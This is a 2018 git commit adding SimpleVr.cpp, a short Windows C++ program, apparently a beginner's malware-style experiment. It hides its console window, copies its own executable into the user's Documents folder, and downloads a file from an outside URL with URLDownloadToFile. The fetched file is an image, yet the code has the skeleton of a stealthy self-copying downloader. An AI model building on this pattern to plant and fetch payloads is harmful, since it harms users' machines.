87bb772f71d3aa7eaa44449e998e1b3a4d7cec63
rb <32129393+Malrb@users.noreply.github.com>
2018-04-06 17:08:28 +0800

    Create SimpleVr.cpp

---
+++ Windows/SimpleVr.cpp
@@ -0,0 +1,49 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <tchar.h>
+#include <urlmon.h>
+#pragma comment(lib, "urlmon.lib")
+#pragma comment(lib,"wininet.lib")
+#define MAX 50
+int main(int argc, char* argv[])
+{
+	//HIDE CONSOLE DURING EXECUTING
+	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
+ 	HWND hwnd_win = GetForegroundWindow();
+    ShowWindow(hwnd_win,SW_HIDE);
+    _sleep(4000);
+//    ShowWindow(hwnd_win,SW_SHOW);
+// 	COPY FILE INTO SPECIFIED PATH 
+	char path[] = "C:\\Users\\rb\\Documents\\copy.exe";
+  	char charArray[MAX];
+  	HMODULE hmodule = GetModuleHandle(0);
+  	GetModuleFileName(hmodule, charArray, MAX);
+  	CopyFile(charArray, path, TRUE);
+  	
+  	HRESULT hr;
+	LPCTSTR Url = _T("https://cdn.free.com.tw/blog/wp-content/uploads/2014/08/Placekitten480-g.jpg"), File = _T("C:\\Users\\rb\\Documents\\download.jpg");
+//	TCHAR url[] = TEXT("https://cdn.free.com.tw/blog/wp-content/uploads/2014/08/Placekitten480-g.jpg");
+//	TCHAR path[MAX] = TEXT("C:\\Users\\rb\\Documents\\download.jpg");
+//	GetCurrentDirectory(MAX, path);
+
+	hr = URLDownloadToFile (0, Url, File, 0, 0);
+	switch (hr)
+	{
+		case S_OK:
+			printf("Successful download\n");
+			break;
+		case E_OUTOFMEMORY:
+			printf("Out of memory error\n");
+			break;
+		case INET_E_DOWNLOAD_FAILURE:
+			printf("Cannot access server data\n");
+			break;
+		default:
+			printf("Unknown error\n");
+			break;
+	}
+	
+	//FreeConsole();
+	return 0;
+}
